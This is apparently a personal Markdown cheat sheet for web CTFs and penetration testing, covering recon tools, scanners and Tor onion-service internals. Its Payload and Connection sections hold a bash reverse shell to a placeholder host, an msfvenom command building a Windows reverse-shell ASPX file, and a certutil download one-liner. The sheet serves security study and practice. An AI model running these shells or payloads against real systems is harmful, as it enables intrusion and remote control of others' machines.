# Web
> [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)  
> [Web Security CheatSheet](https://blog.p6.is/Web-Security-CheatSheet/)  
> [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)  
> [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)  
> [Basic concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q?type=slide#/)  
> [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html)  
> [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/stable/)  
> [PortSwigger Web Security Academy](https://portswigger.net/web-security)

## Tool

### Information Gathering

#### Search Engine
- [SHODAN](https://www.shodan.io/search/examples)

    > Search Engine for the Internet of Everything

    ```
    # Search Query
    #   <keyword> ...
    #   [{[-(filter out)]<attr>:<value>,...(or)} ...(and)]
    #     country:{<country>|tw|us}

    hostname:google.com,facebook.com
    http.html:"index of" country:tw
    Microsoft-IIS port:8530,8531 country:tw -http.status:403  # WSUS
    ```

- [Censys](https://search.censys.io/)

    > Censys helps organizations, individuals, and researchers find and monitor
    > every server on the Internet to reduce exposure and improve security

- [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)


#### OSINT
- [OSINT Framework](https://osintframework.com/)
- maltego

    > A platform for open-source intelligence (OSINT) and cyber investigations

##### DNS Enumeration
- [dnsdumpster](https://dnsdumpster.com/)

    > dns recon & research, find & lookup dns records

- [crt.sh](https://crt.sh/)

    > Enter an Identity (Domain Name, Organization Name, etc)

- [robtex](https://www.robtex.com/)

    > Subdomains

- dnsenum

    ```bash
    # dnsenum
    #   [--noreverse]
    #   [--recursion]
    #   <domain>

    dnsenum google.com
    ```

- gobuster

    ```bash
    # gobuster vhost
    #   [-H, --headers="<key>:<value>" ...]
    #   [--exclude-length={<length>|<length>-<length>},...]
    #   [--append-domain] --domain=<domain>
    #   -w, --wordlist=<wordlist>
    #   -u, --url=<url>

    gobuster vhost --exclude-length=100,200-300 --append-domain --domain=${domain:?} --wordlist=/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --url=http://${domain:?}
    ```

- `knockpy.py`


##### Domain Information
- [IANA WHOIS Service](https://www.iana.org/whois)
- [DomainTools](https://whois.domaintools.com/)
- [VirusTotal](https://www.virustotal.com/gui/home/search)

##### DNS Lookup
- dig

    ```bash
    # dig
    #   [@<server>]
    #   {<name>|-x <addr>} ...
    #   [<type>|A|MX|NS|TXT|CNAME]
    #   [{+<option>|+trace|+https|+nssearch} ...]

    dig @8.8.8.8 www.google.com A
    dig www.google.com A +trace
    dig google.com +nssearch

    dig -x 8.8.8.8
    ```

- nslookup

    ```bash
    # nslookup
    #   [{-type={<type>|A}|-<option>[=<value>]} ...]
    #   {<name>|<addr>}
    #   [<server>]

    nslookup -type=A www.google.com 8.8.8.8

    nslookup 8.8.8.8
    ```

- drill

    ```bash
    # drill
    #   [-T(enable trace)]
    #   {<name>|-x <addr>}
    #   [@<server>]
    #   [<type>|A]

    drill www.google.com @8.8.8.8 A
    drill -T www.google.com          # trace

    drill -x 8.8.8.8
    ```

#### Recon

##### Port Scanning

- Nmap

    ```bash
    # nmap
    #   [-v(verbose)]
    #   [-n(disable DNS resolution)]
    #   [-T{0..5}(5 is fastest)]
    #   [-A(same as -O -sV -sC --traceroute)]
    #   [-Pn(skip host discovery)]
    #   [-sn(disable port scan)]
    #   [-O(enable OS detection)]
    #   [-sS(TCP SYN, default)]
    #   [-sU(UDP scan)]
    #   [-sC(same as --script=default)]
    #   [-sV(show service version info)]
    #   [--script={<pattern>|"http-*"|default|*},...]
    #   [--script-trace]
    #   [--script-help <pattern>(/usr/share/nmap/scripts)]
    #   [-p {-|{[T:|U:]{<port>|<port>-<port>},...},...}]
    #   {<hostname>|<ip>|<ip range>|<subnet>}

    nmap -A ${host:?}                      # Scan with default setting.
    nmap --script="http-*" -p80 ${host:?}  # Scan HTTP service.
    nmap -v -n -T5 -sS -p- ${host:?}       # Scan all ports.
    nmap -v -n -sCV -p- ${host:?}          # Scan all ports with extra info.
    ```

##### Directory Enumeration
- dirsearch

    ```bash
    # dirsearch
    #   [-m, --http-method=<method>]
    #   [-H, --header="<name>: <value>" ...]
    #   [--cookie="<name>=<value>;..."]
    #   [-e, --extensions={<extension>|php|asp},...(only replaces %EXT% by default)]
    #   [-f, --force-extensions]
    #   [--prefixes=<prefix>,...]
    #   [--suffixes=<suffix>,...]
    #   [-r, --recursive]
    #   [--crawl]
    #   [-i, --include-status={<code>|<code>-<code>},...]
    #   [-x, --exclude-status={<code>|<code>-<code>},...]
    #   [--exclude-text=<text> ...]
    #   [--exclude-regex=<regex> ...]
    #   [--exclude-redirect=<redirect url> ...]
    #   -u, --url=<url>

    dirsearch -r -u ${url:?}
    ```

- gobuster

    ```bash
    # gobuster dir

    gobuster dir --url ${url:?} --wordlist ${wordlist:-/usr/share/wordlists/dirb/common.txt} -t ${threads:-100}
    ```

- dirbuster

    ```bash
    # dirbuster
    ```

- dirb

    ```bash
    # dirb
    #   [-H <header_string>]
    #   [-c <cookie_string]
    #   [-X {<extension>|.html}]
    #   [-N <status_code>(ignore responses with this code)]
    #   <url>
    #   [<wordlist>,...]

    dirb ${url:?} ${wordlist}
    ```

- wfuzz

    ```bash
    wfuzz -c -z file,${wordlist:-/usr/share/wordlists/dirb/common.txt} -hc ${hidecode:-404} ${url:?}/FUZZ
    ```

- ffuf

##### Secret Dumper
- git-dumper

##### Fuzzing

- wfuzz

    | Usage | Description |
    |:------|:------------|
    | `$ wfuzz -c -z file,${wordlist:?} -hl ${hideline:-BBB} ${url:?}/?FUZZ{<baseArg1>}=,FUZ2Z{<baseArg2>}=` | Hide all results with same line count to the result queried by parameter <arg1> and <arg2>. |

##### Tech Stack
- [Netcraft Site Report](https://sitereport.netcraft.com/)

    > Find out the infrastructure and technologies used by any site

- [Wappalyzer](https://www.wappalyzer.com/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer)


### Exploit
- Burpsuit
- c-jwt-cracker
- [Exploit DB](https://www.exploit-db.com/)
- Scanner
    - nikto
    - sqlmap
    - xsser
    - ZAP

### Payload
- Backdoor
    - weevely
    - veil
    - BeEF
- Reverse Shell

    > Enable PTY
    >
    > python3 -c 'import pty;pty.spawn("/bin/bash")'

    - `$ bash -c "/bin/bash -i >& /dev/tcp/${HOST}/${PORT} 0<&1"`
    - [reverse ICMP shell (icmpsh)](https://github.com/bdamele/icmpsh)
    - `$ msfvenom --list payloads`
        - `$ msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o reverse.aspx LHOST=${host} LPORT=1337`

### Connection
- `/dev/tcp/<HOST>/<PORT>`
- telnet
- nc / ncat / socat
- `$ certutil.exe -urlcache -f <url> <filename>`
- [HTTPie](https://devhints.io/httpie)

### Public Temp Server
- webhook.site
    - unique URL (https / CORS)
    - unique email
- beeceptor
- hookbin.com
- requestbin.net


## Background

### HTTP Protocol
- [Basics of HTTP](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Basics_of_HTTP)
    - MIME

        > type/subtype;parameter=value

- [URI schemes](https://en.wikipedia.org/wiki/List_of_URI_schemes)
    - Data URI

        > data:[&lt;mediatype&gt;][;base64],&lt;data&gt;

### The Onion Routing Protocol (Tor)
> Tor is an overlay network.
> 
> It is composed by thousands (~ 6-11k) **relays**, connected through
> **channels** that form **circuits** inside which **cells** are sent
> and received.
>
> -- <cite>[microlab.red](https://microlab.red/2024/09/03/tor-internals-for-those-of-us-who-also-have-a-life-1-n/)</cite>

> [The Tor Project](https://www.torproject.org/)  
> [TOR internals, for those of us who also have a life (1/n) | microlab.red](https://microlab.red/2024/09/03/tor-internals-for-those-of-us-who-also-have-a-life-1-n/)  
> [TOR internals, for those of us who also have a life (2/n) | microlab.red](https://microlab.red/2024/09/23/tor-internals-for-those-of-us-who-also-have-a-life-2-n/)  
> [Creating a Testing Tor Network From Scratch | dax](https://medium.com/@dax_dev/creating-a-testing-tor-network-from-scratch-e952d76a18cb)  
> [Decentralized Routing in Tor Hidden Services](https://medium.com/@kyodo-tech/decentralized-routing-in-tor-hidden-services-40e0bc0793d5)

- Directory Authority

    > They are a set of specialized servers within the Tor network that
    > collectively generate and distribute a signed document (known as
    > the **consensus**) containing information about all known Tor relays.
    >
    > -- <cite>[The Tor Proejct](https://community.torproject.org/relay/governance/policies-and-proposals/directory-authority/)</cite>

    - [DA List](https://gitlab.torproject.org/tpo/core/tor/-/blob/HEAD/src/app/config/auth_dirs.inc)
    - Consensus
        - `$ curl https://collector.torproject.org/recent/relay-descriptors/consensuses/`

- Tor Circuit

    > Tor User → Guard Relay / Bridge Relay → Middle Relay → Exit Relay → Destination (example[.]com)
    >
    > -- <cite>[The Tor Project](https://community.torproject.org/relay/types-of-relays/)</cite>

    - Bridge Relay
        - not listed in the public Tor directory
        - use pluggable transports to obfuscate their traffic to make it harder to detect
    - Guard Relay
        - first relay (hop) in a Tor circuit
        - stable and fast
    - Middle Relay
        - concealment
    - Exit Relay
        - Exit Policy

- Onion Hidden Service (.onion)

    ```mermaid
    sequenceDiagram
        actor Client
        participant RP as Rendezvous Point
        participant SD as Hidden Service Directory
        participant IP as Introduction Point
        participant OS as Onion Service

        OS->>IP: estabilish long-term circuit
        activate IP
        OS->>SD: publish service descriptor (introduction point)
        Client->>RP: choose a relay
        activate RP
        Client->>SD: request service descriptor
        Client->>IP: request service (rendezvous point)
        IP->>OS: pass the request
        deactivate IP
        OS->>RP: meet the client
        deactivate RP
    ```

    - Onion Service
        - Period

            ```
            period_number = floor(unix_timestamp / period_length)
            period_length = 1440 min [default 1 day]
            ```

        - Identity Key

            > A 32 bytes ed25519 master key pair.

            ```
            identity_pubkey
            identity_prikey
            ```

        - Blinded Key

            > A daily-rotated identifier derived from **identity_pubkey**
            > related to the **period_number** and **period_length**.

            ```
            blinded_pubkey
            blinded_prikey
            ```

        - Descriptor Key

            > A key pair signed by **blinded_prikey** that is used to sign
            > the service descriptors.

        - Credential & Subcredential

            ```
            CREDENTIAL    = SHA3_256("credential" | identity_pubkey)
            SUBCREDENTIAL = SHA3_256("subcredential" | CREDENTIAL | blinded_pubkey)
            ```

        - Service Address (v3)

            > A 56 bytes long base32 encoded string with ".onion" suffix.

            ```
            service_address = base32(identity_pubkey | CHECKSUM | VERSION) + ".onion"
            CHECKSUM        = blake2b(".onion checksum" | identity_pubkey | VERSION)[:2]
            VERSION         = "\x03"
            ```

    - Hidden Service Directory (HSDir)

        > A subset of Tor relays that store **service descriptors**.

        - Descriptor ID

            > One can determine the HDDir that stores the **service_descripter**
            > from the **identity_pubkey** (embeded in the **service_address**) and the timestamp.
            >
            > Distributed Hash Table (DHT) Model
            > - The first **hsdir_spread_store** relays with the **relay_id**
            >   greater than **descriptor_id** are the target HSDirs.
            > 
            > - Client choose the HSDir randomly from **hsdir_spread_fetch** relays
            >   start from the first match.

            ```
            hsdir_n_replicas    = an integer in range [1, 16] with default value 2.
            hsdir_spread_fetch  = an integer in range [1,128] with default value 3.
            hsdir_spread_store  = an integer in range [1,128] with default value 4.
            shared_random_value = a pre-shared value determined by directory authorities for each period.

            descriptor_id = SHA3-256("stored-at-idx" | blinded_pubkey | hsdir_n_replicas | period_length | period_number)
            relay_id      = SHA3-256("node-idx" | node_identity | shared_random_value | period_number | period_length)
            ```

        - Service Descriptor

            > A service descriptor contains the introduction points, as long
            > as the signature, which can be verified by the pubkey embedded
            > in the service address.
            >
            > [HS-DESC-ENCRYPTION-KEYS](https://spec.torproject.org/rend-spec/hsdesc-encrypt.html#HS-DESC-ENCRYPTION-KEYS)

            - descriptor-lifetime
            - descriptor-signing-key-cert

                > A certificate that is signed by the blinded key to ensure the integrity.

            - superencrypted

                > Data encrypted with a symmetric key derived from **blinded_pubkey**
                > and **SUBCREDENTIAL** to make sure the client knows the **service_address**.

                - auth-client

                  > Decrypt information for authenticated users if restricted
                  > discovery is enabled.

                - encrypted

                  > Data encrypted with a symmetric key derived from **blinded_pubkey**,
                  > **subcredentail**, and **descriptor_cookie** (if restricted
                  > discovery is enabled, leave blank otherwise)

                  - introduction-point

                    > Provide 3 relays by default.

            - signature

    - Introduction Point

        > An onion service establishes long-term circuits to 3 different
        > Tor relays, called introduction points, to conceal its location
        > from clients.
        >
        > A client selects one of these introduction points, as listed in
        > the service descriptor, to initiate communication with the
        > service.

    - Rendezvous Point
        - verify secret from both side
